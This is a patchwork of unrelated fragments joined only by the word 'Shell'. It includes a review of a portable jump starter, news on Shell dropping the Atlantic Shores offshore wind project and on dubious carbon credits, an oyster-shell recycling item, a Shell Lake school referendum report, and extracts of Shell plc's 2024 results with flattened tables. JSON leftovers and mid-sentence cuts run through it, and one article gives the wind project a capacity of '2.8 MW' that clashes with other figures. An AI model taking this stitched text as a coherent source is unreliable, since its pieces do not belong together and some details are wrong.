Flashlight\n\nThe unit\u2019s charging bank can power other mobile devices with the included USB cords. During an emergency, the integrated charging bank will be worth its weight in gold. If you end up stranded due to a blizzard or car trouble, you can easily charge your phone or tablet with the 1200A Shell Portable Jump Starter.\n\nLikewise, the unit includes a built-in flashlight with four settings: a standard light, a white floodlight, a red strobe, and an SOS flash. Like the device charging capability, the flashlight settings would be invaluable during an emergency.\n\n800A Verus 1200A: Which One Is Best?\n\nThe 800A and the 1200A Shell Portable Jump Starters (the one featured in this review) are similar in many ways.\n\nLike the 1200A, the 800A has a flashlight and charging bank in case of an emergency, reverse polarity and overheat notifications, and a carrying case. Both units can handle a variety of other vehicles, including motorcycles, boats, campers, and snowmobiles.\n\nHere is a quick look at the key differences between the two units:\n\nCapacity & Capability\n\nThe 1200A Shell Portable Jump Starter offers 16,000 mAh versus the 800A at 12,000 mAh. This is the most important difference between the two units.\n\nThe letters \u201cmAh\u201d stand for milliampere-hour, a standard unit of measurement that represents how long a battery can discharge its stored energy (i.e., how long it can last). On average, higher mAh is associated with longer battery life and more overall capability.\n\nIn terms of capability, the higher mAh of the 1200A unit allows it to jump gasoline engines as large as seven liters displacement, whereas the 800A will not handle anything over six liters. Likewise, the 1200A unit will accommodate diesel engines up to three liters. However, the 800A cannot jump a diesel engine over two liters in displacement.\n\nSize\n\nThe 800A is smaller than the 1200A (2.42 lbs. versus 3.1 lbs.), making it easier to stow.\n\nCharging Time\n\nGiven its smaller size, the 800A will charge anywhere from an hour and a half to two and a half hours quicker than the larger 1200A. However, the 2.4A car charger only comes with the 1200A jump starter.\n\nMaking The Right Choice\n\nSome of this will come down to necessity. For example, if you own a late-model GM truck or an SUV with the three-liter Duramax or a late-model F-150 with the three-liter Power Stroke, the 800A may not be enough if you need a jump. In that case, the 1200A is well worth the extra money.\n\nThe 1200A jump starter, with its higher mAh, will have a longer internal battery life, meaning it will better supply the necessary juice to your mobile devices via the charging bank in an emergency. All things being equal, the flashlight and emergency SOS lights will also run longer.\n\nOn the other hand, if you have a daily driver and only need something basic to jump your battery in a pinch, the 800A Shell portable jump starter will do the trick.\n\n1200A Shell Jump Starter See Best Price As an Amazon Associate, Automoblog earns from qualifying purchases. The 1200A Shell Portable Jump Starter provides the convenience of on-demand power if your car battery dies.\n\n\n\nHelpful features include a built-in LED flashlight, a charging bank for smartphones and tablets, and reverse polarity protection.\n\nIs This Shell Portable Jump Starter Worth It?\n\nThe 1200A retails for around $130, not counting any deals or discounts. While your car battery may die only once in a blue moon, something like the 1200A Shell Portable Jump Starter will have you covered. The integrated charging bank and flashlight add extra value.\n\nWhile we enjoy having the 1200A Shell Portable Jump Starter, we are also fond of our NOCO GB40. Based on our experience, the GB40 is more robust than this Shell unit, as it has a harder protective casing. We prefer the clamp design of the GB40, and its internal battery seems to last longer.\n\nThat said, we are still grateful Shell sent us this portable jump starter to test out. We continue to use it and think it\u2019s an excellent addition to a winter emergency kit.

            "content": "In the first serious fallout from President Donald Trump\u2019s early actions against offshore wind power, oil and gas giant Shell is walking away from a major project off the coast of New Jersey.\n\nShell told The Associated Press it is writing off the project, citing increased competition, delays and a changing market.\n\n\u201cNaturally we also take regulatory context into consideration,\u201d spokesperson Natalie Gunnell said in an email.\n\nShell co-owns the large Atlantic Shores project, which has most of its permits and would generate enough power for 1 million homes if both of two phases were completed. That\u2019s enough for one-third of New Jersey households.\n\nIt\u2019s unclear whether Shell\u2019s decision kills the project \u2014 partner EDF-RE Offshore Development says it remains committed to Atlantic Shores.\n\nOn his first day in office, Trump signed an executive order singling out offshore wind for contempt with a temporary halt on all lease sales in federal waters and a pause on approvals, permits and loans. Perhaps most of interest to Shell, the order directs administration officials to review existing offshore wind energy leases and identify any legal reasons to terminate them.\n\nLarge offshore wind farms have been making electricity for three decades in Europe, and more recently in Asia. They are considered by experts to be an essential part of addressing climate change because they can take the place of fossil fuel plants, if paired with battery storage. New Jersey has set a goal of generating 100% of its energy from clean sources by 2035.\n\nThe Biden administration approved plans to build the Atlantic Shores project in two phases in October, but construction has not begun. Oliver Metcalfe, head of wind research at BloombergNEF, said the partners are facing significant uncertainty about their lease, and other developers are watching what happens with Atlantic Shores closely. \u201cWe\u2019re in uncertain territory here,\u201d he added.\n\nOffshore wind foes, who are particularly vocal and well-organized in New Jersey, celebrated Shell\u2019s withdrawal. Republican Rep. Jeff Van Drew, of New Jersey, helped the Trump team draft the executive order. He said Shell\u2019s decision is a \u201cbig win\u201d for New Jersey\u2019s coastline and economy but \u201cthis fight is not over.\u201d\n\nRobin Shaffer, president of Protect Our Coast NJ, said that without Shell\u2019s financial backing, it appears the project is \u201cdead in the water.\u201d\n\nShell is writing off a nearly $1 billion investment. It announced its decision on Thursday, as it reported a 16% decline in full-year earnings of $23.7 billion from $28.3 billion. Most of its business is oil and gas.\n\nDanish wind developer Orsted was close to beginning work on two offshore wind farms in New Jersey but scrapped the project in Oct. 2023 after deciding it would not be economical.\n\nA lot of clean energy is cheap now, but offshore wind is still among the most expensive. That can make these projects less attractive to investors, absent strong policy support, said Coco Zhang, vice president for environmental, social and governance research at ING.\n\n\u201cThe potential uncertainty that the executive order has brought to the market, it cannot be ignored,\u201d she said.\n\nThe Biden administration sought to ramp up offshore wind as a climate change solution, setting national goals to deploy offshore wind energy, holding lease sales and approving nearly a dozen commercial-scale offshore wind energy projects.\n\n___\n\nThe Associated Press\u2019 climate and environmental coverage receives financial support from multiple private foundations.

            "content": "Shell has avoided paying compensation for nearly 2 million sham carbon credits it supported in China, as registry Verra has been unable to hold the world\u2019s largest offsets buyer to account for the scandal.\n\nVerra told Climate Home the case is \u201cunprecedented\u201d, but it raises questions over the leading carbon standard\u2019s ability to enforce its rules and guarantee integrity in the ailing voluntary carbon market \u2013 especially when critical decisions concern a dominant player like Shell.\n\nThe energy giant was closely involved in ten carbon offsetting programmes that aimed to slash methane gas released from rice paddies across eastern China. But, as Climate Home previously revealed, the carbon credits \u2013 which Shell partly used to justify sales of \u201ccarbon neutral\u201d liquefied natural gas (LNG) \u2013 failed to cut planet-heating emissions as claimed.\n\nAfter identifying serious issues and cancelling the projects in late August 2024, Verra informed a Shell subsidiary in China that the meaningless credits would need to be compensated.\n\nSo far, however, the carbon standard has been unable to claw back any of the 1.8 million credits generated by the ten projects, which were primarily used by Shell to offset real greenhouse gas emissions created by its vast fossil fuel operations. Other users of the phantom rice-farming credits include Chinese state-owned fossil fuel firm PetroChina, Singapore-based DBS Bank and UK energy supplier OVO Energy.\n\nHit-and-run\n\nWhile the projects were originally set up by a small Chinese agritech firm called Hefei Luyu, Shell acted as their \u201cauthorised representative\u201d in dealings with Verra, assuming \u201call applicable rights and responsibilities\u201d equivalent to those of the project developer. Climate Home understands that both Hefei Luyu and Shell should have been on the hook for paying back the over-issued credits.\n\nFarmers till rice fields and transplant rice seedlings in Anqing city, Anhui province, China, June 4, 2023. (Photo by CFOTO/Sipa USA)\n\nBut on September 11 last year \u2013 less than two weeks after Verra\u2019s compensation order \u2013 Hefei Luyu and Shell ended their agreement, enabling the fossil fuel multinational to abruptly abandon the projects.\n\nVerra told Climate Home that \u201cany business arrangements between the representative and the project proponent fall outside Verra\u2019s purview to oversee or enforce\u201d.\n\nCommenting on the case, Danny Cullenward, a lawyer and climate economist at the University of Pennsylvania, said exiting the agreement does not relieve Shell of its past obligations. Those include being responsible for any potentially \u201cfalse, fraudulent or misleading statements\u201d made to Verra in the course of Shell\u2019s work as the proxy project proponent, added Cullenward who analysed the project documents.\n\nBut, as yet, Verra has taken no action against Shell. In contrast, the carbon credit registry sanctioned Hefei Luyu after the Chinese company failed to reply to Verra\u2019s emails and compensate for the credits. Hefei Luyu cannot hold an account on the platform or register new projects until compensation is delivered.\n\nVerra told Climate Home there is nothing more it can do against the Chinese firm, but added that it reserves the right to take further action in line with its rules, without providing further details on the potential measures. The registry has so far obtained compensation for 480,000 credits issued by other rice farming projects, unrelated to the Shell ones.\n\n\n\nCullenward said Verra had failed to explain why it cannot hold Shell accountable for the cancelled projects in China.\n\n\u201cIf something in Verra\u2019s internal rules prevents this outcome, Verra should identify and fix the loophole,\u201d he added. \u201cOtherwise it is practically begging to be defrauded in the future.\u201d\n\nCullenward suggested that, even if Verra\u2019s own rules prevent it from taking action in its registry system, the organisation could bring legal proceedings against Shell.\n\n\u2018Rampant conflicts of interest\u2019\n\nCullenward said the situation also illustrates the \u201crampant conflicts of interest inherent to unregulated carbon markets\u201d.\n\nVerra oversees carbon projects\u2019 adherence to its rules, and has the power to suspend or cancel them \u2013 but it also relies heavily on the continued generation of new carbon credits to sustain its operations. Verra earns the vast majority of its income \u2013 close to 80% in 2023 \u2013 from charging a levy on each credit issued by its certified projects.\n\nShell is a dominant force in the carbon credit market, relying heavily on offsets to reach its climate targets to reduce emissions from its oil and gas operations. The energy company used 14.5 million credits in 2024 \u2013 nearly three times more than the second-largest buyer, Microsoft \u2013 according to data provider Allied Offsets.\n\n\u201cWhen they crack down on problematic practices, they hurt their own business prospects,\u201d said Cullenward.\n\nShell announced on Thursday it had raised dividends paid to shareholders, despite a drop in profits in the fourth quarter of last year. At the same time, the firm has cut back investment in its clean energy division, which in 2024 amounted to seven times less than spending on oil and gas, according to analysis by campaigners at Global Witness.\n\nIn response to a request for comment from Climate Home, Shell repeated a statement it first made in August, which said the company was \u201cdisappointed to learn of the issues Verra identified with these [carbon] projects during their recent review\u201d and indicated it would \u201ccontinue to work closely with Verra to understand the impact of their findings\u201d.\n\nA Verra spokesperson told Climate Home that its system is working, as \u201cVerra identified the issues with the projects and is following its quality control procedures to address them, including holding parties accountable for where they failed to conform to program rules and follow through on compensation\u201d.\n\nVerra is committed to \u201ccontinual improvement\u201d \u2013 and lessons learned from this case have been incorporated into \u201cprocedures that will substantially reduce the risk of these issues being repeated going forward\u201d, the spokesperson added.\n\n(Reporting by Matteo Civillini; editing by Megan Rowling)",

Events like the annual Hatteras Island Oyster Roast, hosted by the Coastal Federation at Oden\u2019s Dock each February, also generate significant volumes of shells that are then recycled.\n\nThe shells are allowed to cure naturally in the sun and then are taken to oyster restoration projects throughout the region.\n\nOne of the projects that the Coastal Federation completed last spring was a 100-foot-long reef in the Pamlico Sound off Pea Island which used 300 bushels of recycled oyster shells.\n\nThe Coastal Federation also maintains a half-acre demonstration oyster lease in the waters off their office at the Wanchese Marine Industrial Park. This site allows them to showcase different oyster-growing techniques and gear types to those interested in starting their own oyster farm.\n\nLooking ahead, the Coastal Federation is seeking additional funding and partnerships to expand the shell recycling efforts even further on the Outer Banks, across the state\u2019s 20 coastal counties, and even to the inland metropolitan areas of North Carolina.\n\n\u201cOysters are so important to the health of our coastal ecosystems, and the shell recycling program is a critical part of restoring and protecting those habitats,\u201d said Blakey. \u201cWe\u2019re grateful to the Outer Banks Community Foundation for recognizing the value of this work and providing the resources to help us grow the program.\u201d\n\nFor more information about the N.C.

It was narrowly voted down by about 50 votes out of over 2,000.\n\nEarlier this month, the School Board approved a second attempt at the referendum on the April ballot. According to a Spooner Advocate report, board members believe many residents simply did not have enough information on the referendum in November or may have been more focused on the presidential race.\n\nSuperintendent Todd Felhofer says he\u2019s now working to develop materials to inform the public before the April election. According to him, the Shell Lake School District has been very fiscally conservative and ranks nearly last in per-pupil revenue limit. The School Board is also considering alternative budget solutions like switching from trimesters to semesters and reaching out to local organizations like the Chamber of Commerce and City Council.\n\nOperational referendums have become an increasingly popular tool for school districts looking to address budget shortfalls. Over 25% of the districts across the state had a referendum on the November ballot. School officials have cited issues like inflation, decreasing enrollment and the expiration of Covid-19 pandemic aid as contributing to the growing budget constraints. Many of the referendums simply seek to maintain the current services schools offer.\n\nOther districts like the School District of Ashland are also reworking their November referendum questions for the April ballot following narrow failures.",

            "content": "\n\nOil major Shell is continuing to reduce its involvement in renewable energy and offshore wind including effectively ending its involvement with the U.S. offshore wind energy sector. Buried within today\u2019s year-end 2024 financial report is a note that results include impairment charges of more than $1 billion \u201cmainly relating to renewable generation assets in North America.\u201d\n\nThe company has been moving away from its previous push into renewables as part of a strategy that CEO Wael Sawan described as \u201csimplification\u201d which is helping to deliver over $3 billion in cost cuts since 2022. Commented on renewable energy the company said it was \u201chigh grading its portfolio.\u201d\n\nThe bulk of the $1.085 billion impairment charge is being taken in the fourth quarter ($996 million) and relates to the company\u2019s decision to \u201cpause\u201d its involvement in a joint venture to develop New Jersey\u2019s Atlantic Shores offshore wind project. Shell New Energies US and EDF-RE Offshore Development (a subsidiary of EDF Renewables) won U.S. federal approval in October 2024 for the construction plan for a two-stage project that would provide 2.8 MW of energy to New Jersey with up to nearly 200 turbines. The project was bid into New Jersey\u2019s fourth round of wind solicitations.\n\n\u201cWe just don\u2019t see that it fits both our capabilities nor the returns that we would like,\u201d Shell\u2019s Chief Financial Officer Sinead Gorman said in a call with reporters reports Bloomberg. \u201cSo we took the decision to effectively write that off and pause our involvement.\u201d\n\nWhen the construction plan was approved it was highlighted the project would be the first offshore wind project in New Jersey. The lease dates to 2015 when it was awarded to US Wind and later transferred in 2018 to EDF and later into the joint venture with Shell. The project, which would be about 9 miles off the New Jersey shores near Atlantic City and Sea Girt, faced strong local opposition and was used by Donald Trump to highlight his disapproval of offshore wind.\n\nWhile opponents of the project hoped today's announcement would mark the end of the effort, Atlantic Shores issued a statement saying it intends to continue progressing New Jersey\u2019s first offshore wind project and its portfolio in compliance with its obligations to local, state and federal partners under existing leases and relevant permits. Trump wrote online last week he hoped the project would be \u201cdead and gone.\u201d EDF did not comment, but Atlantic Shores wrote in its statement, \"Business plans, projects, portfolio projections and scopes evolve over time \u2013 and as expected for large, capital-intensive infrastructure projects like ours, our shareholders have always prepared long-term strategies that contemplate multiple scenarios that enable Atlantic Shores to reach its full potential.\"\n\nShell in March 2024 also announced it had sold its 50 percent position in SouthCoast Wind Energy to joint venture partner Ocean Winds North America as part of the realignment of its renewables portfolio. Shell had entered into the joint venture in 2018 for the project which was then known as Mayflower Wind. Ocean Winds has continued to pursue the project and BOEM recently approved the construction plan. It calls for an approximate capacity of 2.4 GW in a lease area about 30 miles south of Martha\u2019s Vineyard and 23 miles south of Nantucket, Massachusetts. The project however has faced delays as it is still negotiating its power purchase agreements with Rhode Island and Massachusetts.\n\nShell's continued move away from renewable energy came as the company reported a 16 percent decline in profits for 2024. While raising its dividend, the company said operations were performing well but cited lower margins for LNG, lower oil and gas prices, lower demand, and weaker margins for its refinery operations. Earnings were $23.72 billion down from $28.25 billion in 2023 and the $1 billion impairment in renewables was part of a larger net impairment charge of $2.2 billion expected in the fourth quarter.\n\n",

The joint venture by Shell New Energies US LLC and EDF-RE Offshore Development, LLC was targeted by anti-wind power groups and Rep. Jeff Van Drew, who worked with President Donald Trump\u2019s administration officials to draft the Jan. 20 executive order for a six-month delay of permitting.\n\nDespite Shell\u2019s morning announcement, Atlantic Shores management later put out a brief statement saying the venture \u201cis committed to New Jersey and delivering the Garden State\u2019s first offshore wind project.\u201d\n\n\u201cWhile we can\u2019t comment on the views of shareholders, Atlantic Shores intends to continue progressing New Jersey\u2019s first offshore wind project and our portfolio in compliance with our obligations to local, state and federal partners under existing leases and relevant permits,\u201d the statement added.\n\nThe statement gave no indication as to whether EDF might seek a new joint venture partner. Even if stalled the Atlantic Shores backers still have the federal lease rights for potential future development.\n\nThe Bureau of Ocean Energy Management approved the Atlantic Shores construction and operations plan Sept. 30, amid a flurry of actions under the Biden administration to advance wind projects. In February 2022 Shell was a participant in BOEM\u2019s record-setting $4.37 billion New York Bight wind leases auction, a high point in the Biden era rush by developers optimistic about their U.S. prospects.\n\nWithin two years, the industry faced mounting pressures from inflation, mounting costs, and supply chain problems. In autumn 2023, industry leader \u00d8rsted suddenly announced it was giving up on its Ocean Wind project off New Jersey, a planned 1,100 MW project that had been a centerpiece of state officials\u2019 ambitions for renewable energy.\n\nIn the meantime, Shell CEO Wael Sawan began pulling back from the company\u2019s earlier shifts toward renewables and moved to concentrate on the better returns from Shell\u2019s legacy oil and gas business.",

Also known as Mero-3, the FPSO has an operational capacity of 180,000 barrels of oil per day (Shell share 19.3% ).\n\nIn December 2024, we, along with Equinor ASA, announced the combination of our UK offshore oil and gas assets and expertise to form a new company which will be the UK North Sea\u2019s biggest independent producer. On deal completion, the new independent producer will be jointly owned by Equinor ( 50% ) and Shell ( 50% ). Completion of the transaction remains subject to approvals and is expected by the end of 2025.\n\nIn December 2024, we announced a final investment decision (FID) on Bonga North, a deep-water project off the coast of Nigeria. Shell ( 55% ) operates the Bonga field in partnership with Esso Exploration and Production Nigeria Ltd. ( 20% ), Nigerian Agip Exploration Ltd. ( 12.5% ), and TotalEnergies Exploration and Production Nigeria Ltd.

Prior period comparatives have been revised to conform with current year presentation with an offsetting impact on all the other segments.\n\nThe Corporate segment covers the non-operating activities supporting Shell. It comprises Shell\u2019s holdings and treasury organisation, headquarters and central functions, self-insurance activities and centrally managed longer-term innovation portfolio. All finance expense, income and related taxes are included in Corporate segment earnings rather than in the earnings of business segments.\n\nQuarter Analysis1\n\nSegment earnings, compared with the third quarter 2024, reflected favourable tax movements and favourable currency exchange rate effects.\n\nAdjusted EBITDA2 was mainly driven by favourable currency exchange rate effects.\n\n\n\n\n\nFull Year Analysis1\n\nSegment earnings, compared with the full year 2023, were primarily driven by favourable tax movements, favourable net interest movements and favourable currency exchange rate effects.\n\nFull year 2024 segment earnings also included reclassifications from equity to profit and loss of cumulative currency translation differences related to funding structures resulting in unfavourable movements of $1,122 million . These reclassifications are included in identified items.\n\nAdjusted EBITDA2 was mainly driven by favourable currency exchange rate effects and lower operating expenses.\n\n\n\n\n\n1.All earnings amounts are shown post-tax, unless stated otherwise.\n\n2.Adjusted EBITDA is without taxation.\n\n\n\n\n\n\n\n\n\nPage 11\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSHELL PLC\n\n4th QUARTER 2024 AND FULL YEAR UNAUDITED RESULTS\n\n\n\nPRELIMINARY RESERVES UPDATE\n\nWhen final volumes are reported in the 2024 Annual Report and Accounts and 2024 Form 20-F, Shell expects that SEC proved oil and gas reserves additions before taking into account production will be approximately 0.9 billion boe, and that 2024 production will be approximately 1.1 billion boe. As a result, total proved reserves on an SEC basis are expected to be approximately 9.6 billion boe1, 2, 3. Acquisitions and divestments of 2024 reserves are expected to account for a net increase of approximately 0.05 billion boe.\n\nThe proved Reserves Replacement Ratio on an SEC basis is expected to be 85% for the year ( 106% without debooking Groundbirch because of the low average AECO price in 2024) and 108% for the 3-year average. Excluding the impact of acquisitions and divestments, the proved Reserves Replacement Ratio is expected to be 80% ( 102% without debooking Groundbirch) for the year and 68% for the 3-year average.\n\nFurther information will be provided in the 2024 Annual Report and Accounts and 2024 Form 20-F.\n\n1.Pursuant to our 2017 agreement with Canadian Natural Resources Limited, our remaining mining interest and associated synthetic crude oil reserves will be swapped for an additional 10% interest in the Scotford upgrader and Quest CCS project. The transaction is expected to close by the end of the first quarter 2025, subject to regulatory approvals. The associated proved reserves at December 31, 2024 are 0.7 billion barrels (of which 50% attributable to non-controlling interest).\n\n2.On January 16, 2024, we announced an agreement to sell our Nigerian onshore subsidiary The Shell Petroleum Development Company of Nigeria Limited (SPDC) which holds a 30% interest in the SPDC JV to Renaissance, subject to various conditions. As of December 31, 2024, we had proved reserves of 0.5 billion boe in SPDC.\n\n3.In December 2024, we, along with Equinor ASA, announced the combination of our UK offshore oil and gas assets and expertise to form a new company which will be the UK North Sea\u2019s biggest independent producer. On deal completion, the new independent producer will be jointly owned by Equinor ( 50% ) and Shell ( 50% ) and 0.16 billion boe (as of December 31, 2024) of Shell\u2019s proved reserves will be contributed to the new joint venture alongside proved reserves contributed by Equinor. Subsequently, Shell will report 50% of the proved reserves of the new joint venture as part of Shell\u2019s share of proved reserves from joint ventures and associates.\n\n\n\n\n\n\n\n\n\n\n\n\n\nPage 12\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSHELL PLC\n\n4th QUARTER 2024 AND FULL YEAR UNAUDITED RESULTS\n\n\n\nOUTLOOK FOR THE FIRST QUARTER 2025\n\nFull year 2024 cash capital expenditure was $21 billion . Our cash capital expenditure range for the full year 2025 is expected to be lower than our 2024 range, with more guidance to come at the Capital Markets Day 2025.\n\n\n\n\n\nIntegrated Gas production is expected to be approximately 930 - 990 thousand boe/d. First quarter 2025 outlook reflects Pearl GTL back in operation after a major turnaround. LNG liquefaction volumes are expected to be approximately 6.6 - 7.2 million tonnes.\n\n\n\n\n\nUpstream production is expected to be approximately 1,750 - 1,950 thousand boe/d.\n\n\n\n\n\nMarketing sales volumes are expected to be approximately 2,500 - 3,000 thousand b/d.\n\n\n\n\n\nRefinery utilisation is expected to be approximately 80% - 88% . Chemicals manufacturing plant utilisation is expected to be approximately 78% - 86% .\n\n\n\n\n\nCorporate Adjusted Earnings were a net expense of $380 million 1 for the fourth quarter 2024. Corporate Adjusted Earnings2 are expected to be a net expense of approximately $400 - $600 million in the first quarter 2025.\n\n1.From the first quarter 2024, Shell's longer-term innovation portfolio is managed centrally and hence reported as part of the Corporate segment (previously all other segments).

Basis of preparation\n\nThese unaudited Condensed Consolidated Financial Statements of Shell plc (\u201cthe Company\u201d) and its subsidiaries (collectively referred to as \u201cShell\u201d) have been prepared on the basis of the same accounting principles as those used in the Company's Annual Report and Accounts (pages 244 to 316) for the year ended December 31, 2023, as filed with the Registrar of Companies for England and Wales and as filed with the Autoriteit Financi\u00eble Markten (the Netherlands) and Form 20-F (pages 217 to 290) for the year ended December 31, 2023, as filed with the US Securities and Exchange Commission, and should be read in conjunction with these filings.\n\nThe financial information presented in the unaudited Condensed Consolidated Financial Statements does not constitute statutory accounts within the meaning of section 434(3) of the Companies Act 2006 (\u201cthe Act\u201d). Statutory accounts for the year ended December 31, 2023, were published in Shell's Annual Report and Accounts, a copy of which was delivered to the Registrar of Companies for England and Wales, and in Shell's Form 20-F. The auditor's report on those accounts was unqualified, did not include a reference to any matters to which the auditor drew attention by way of emphasis without qualifying the report and did not contain a statement under sections 498(2) or 498(3) of the Act. The statutory accounts for the year ended December 31, 2024, will be delivered to the Registrar of Companies for England and Wales in due course.\n\n\n\n\n\n2. Segment information\n\nSegment earnings are presented on a current cost of supplies basis (CCS earnings), which is the earnings measure used by the Chief Executive Officer for the purposes of making decisions about allocating resources and assessing performance. On this basis, the purchase price of volumes sold during the period is based on the current cost of supplies during the same period after making allowance for the tax effect. CCS earnings therefore exclude the effect of changes in the oil price on inventory carrying amounts. Sales between segments are based on prices generally equivalent to commercially available prices.\n\nFrom the first quarter 2024, Wholesale commercial fuels forms part of Mobility with inclusion in the Marketing segment (previously Chemicals and Products segment). The change in segmentation reflects the increasing alignment between the economic characteristics of Wholesale commercial fuels and other Mobility businesses, and is consistent with changes in the information provided to the Chief Operating Decision Maker. Prior period comparatives have been revised to conform with current year presentation with an offsetting impact between the Marketing and the Chemicals and Products segment (see below). Also, from the first quarter 2024, Shell's longer-term innovation portfolio is managed centrally and hence reported as part of the Corporate segment (previously all other segments). Prior period comparatives have been revised to conform with current year presentation with an offsetting impact on all the other segments (see below).\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPage 18\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSHELL PLC\n\n4th QUARTER 2024 AND FULL YEAR UNAUDITED RESULTS\n\n\n\nREVENUE AND CCS EARNINGS BY SEGMENT Quarters $ million Full year Q4 2024 Q3 2024 Q4 2023 2024 2023 Third-party revenue 9,294 9,748 10,437 Integrated Gas 37,290 37,645 1,652 1,605 1,263 Upstream 6,606 6,475 27,524 30,519 31,761 Marketing2 120,088 130,560 19,992 22,608 24,957 Chemicals and Products2 90,918 97,079 7,808 6,599 10,302 Renewables and Energy Solutions 29,366 44,819 10 10 11 Corporate 43 42 66,281 71,089 78,732 Total third-party revenue1 284,312 316,620 Inter-segment revenue 2,024 2,131 2,614 Integrated Gas 8,715 11,560 9,931 9,618 10,948 Upstream 39,939 41,230 984 1,235 1,243 Marketing2 4,937 5,299 8,656 9,564 10,163 Chemicals and Products2 38,381 42,816 1,879 1,131 1,567 Renewables and Energy Solutions 4,971 4,707 \u2014 \u2014 \u2014 Corporate \u2014 \u2014 CCS earnings 1,744 2,631 1,733 Integrated Gas 9,590 7,058 1,031 2,289 2,151 Upstream 7,772 8,539 103 760 226 Marketing2 1,894 3,058 (328) 341 (1,828) Chemicals and Products2 1,757 1,482 (1,226) (481) (272) Renewables and Energy Solutions (1,229) 3,089 (335) (647) (629) Corporate3 (2,992) (2,944) 989 4,894 1,381 Total CCS earnings4 16,792 20,281\n\n1.Includes revenue from sources other than from contracts with customers, which mainly comprises the impact of fair value accounting of commodity derivatives.\n\n2.From January 1, 2024, onwards Wholesale commercial fuels has been reallocated from the Chemicals and Products segment to the Marketing segment.

This measure excludes earnings attributable to non-controlling interest.\n\nWe define \u201cAdjusted EBITDA\u201d as \u201cIncome/(loss) for the period\u201d adjusted for current cost of supplies; identified items; tax charge/(credit); depreciation, amortisation and depletion; exploration well write-offs and net interest expense.

Identified items related to subsidiaries are consolidated and reported across appropriate lines of the Consolidated Statement of Income. Only pre-tax identified items reported by subsidiaries are taken into account in the calculation of underlying operating expenses (Reference F).\n\nProvisions for onerous contracts: Provisions for onerous contracts that relate to businesses that Shell has exited or to redundant assets or assets that cannot be used.\n\nFair value accounting of commodity derivatives and certain gas contracts: In the ordinary course of business, Shell enters into contracts to supply or purchase oil and gas products, as well as power and environmental products. Shell also enters into contracts for tolling, pipeline and storage capacity. Derivative contracts are entered into for mitigation of resulting economic exposures (generally price exposure) and these derivative contracts are carried at period-end market price (fair value), with movements in fair value recognised in income for the period. Supply and purchase contracts entered into for operational purposes, as well as contracts for tolling, pipeline and storage capacity, are, by contrast, recognised when the transaction occurs; furthermore, inventory is carried at historical cost or net realisable value, whichever is lower. As a consequence, accounting mismatches occur because: (a) the supply or purchase transaction is recognised in a different period, or (b) the inventory is measured on a different basis. In addition, certain contracts are, due to pricing or delivery conditions, deemed to contain embedded derivatives or written options and are also required to be carried at fair value even though they are entered into for operational purposes. The accounting impacts are reported as identified items.\n\nImpact of exchange rate movements and inflationary adjustments on tax balances represents the impact on tax balances of exchange rate movements and inflationary adjustments arising on (a) the conversion to dollars of the local currency tax base of non-monetary assets and liabilities, as well as losses (this primarily impacts the Upstream and Integrated Gas segments) and (b) the conversion of dollar-denominated inter-segment loans to local currency, leading to taxable exchange rate gains or losses (this primarily impacts the Corporate segment).\n\nOther identified items represent other credits or charges that based on Shell management's assessment hinder the comparative understanding of Shell's financial results from period to period.\n\n\n\n\n\n\n\n\n\nPage 33\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSHELL PLC\n\n4th QUARTER 2024 AND FULL YEAR UNAUDITED RESULTS\n\n\n\nB. Adjusted Earnings per share\n\nAdjusted Earnings per share is calculated as Adjusted Earnings (see Reference A), divided by the weighted average number of shares used as the basis for basic earnings per share (see Note 4).\n\n\n\n\n\nC. Cash capital expenditure\n\nCash capital expenditure represents cash spent on maintaining and developing assets as well as on investments in the period. Management regularly monitors this measure as a key lever to delivering sustainable cash flows. Cash capital expenditure is the sum of the following lines from the Consolidated Statement of Cash Flows: Capital expenditure, Investments in joint ventures and associates and Investments in equity securities.\n\nSee Note 2 \u201cSegment information\u201d for the reconciliation of cash capital expenditure.\n\n\n\n\n\nD. Capital employed and Return on average capital employed\n\nReturn on average capital employed (\"ROACE\") measures the efficiency of Shell\u2019s utilisation of the capital that it employs. Effective first quarter 2024, the definition of capital employed has been amended to reflect the deduction of cash and cash equivalents. In addition, the numerator applied to ROACE on an Adjusted Earnings plus non-controlling interest basis has been amended to remove interest on cash and cash equivalents for consistency with the revised capital employed definition. Comparative information has been revised to reflect the updated definition. Also, the presentation of ROACE on a net income basis has been discontinued, as this measure is not routinely used by management in assessing the efficiency of capital employed.\n\nThe measure refers to Capital employed which consists of total equity, current debt, and non-current debt reduced by cash and cash equivalents.\n\nManagement believes that the updated methodology better reflects Shell\u2019s approach to managing capital employed, including the management of cash and cash equivalents alongside total debt and equity as part of the financial framework.\n\nIn this calculation, the sum of Adjusted Earnings (see Reference A) plus non-controlling interest (NCI) excluding identified items for the current and previous three quarters, adjusted for after-tax interest expense and after-tax interest income, is expressed as a percentage of the average capital employed excluding cash and cash equivalents for the same period.\n\n$ million Quarters Q4 2024 Q3 2024 Q4 2023 Current debt 9,931 10,119 9,001 Non-current debt 71,610 72,028 74,794 Total equity 188,362 192,943 192,597 Less: Cash and cash equivalents (38,774) (43,031) (40,246) Capital employed \u2013 opening 231,128 232,059 236,146 Current debt 11,630 12,015 9,931 Non-current debt 65,448 64,597 71,610 Total equity 180,165 189,538 188,362 Less: Cash and cash equivalents (39,110) (42,252) (38,774) Capital employed \u2013 closing 218,132 223,898 231,128 Capital employed \u2013 average 224,630 227,979 233,637\n\n\n\n\n\n\n\n\n\nPage 34\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSHELL PLC\n\n4th QUARTER 2024 AND FULL YEAR UNAUDITED RESULTS\n\n\n\n$ million Quarters Q4 2024 Q3 2024 Q4 2023 Adjusted Earnings - current and previous three quarters (Reference A) 23,716 27,361 28,250 Add: Income/(loss) attributable to NCI - current and previous three quarters 427 376 277 Add: Current cost of supplies adjustment attributable to NCI - current and previous three quarters 14 56 (5) Less: Identified items attributable to NCI (Reference A) - current and previous three quarters 18 7 (11) Adjusted Earnings plus NCI excluding identified items - current and previous three quarters 24,139 27,787 28,534 Add: Interest expense after tax - current and previous three quarters 2,701 2,698 2,728 Less: Interest income after tax on cash and cash equivalents - current and previous three quarters 1,389 1,392 1,287 Adjusted Earnings plus NCI excluding identified items before interest expense and interest income - current and previous three quarters 25,452 29,093 29,975 Capital employed \u2013 average 224,630 227,979 233,637 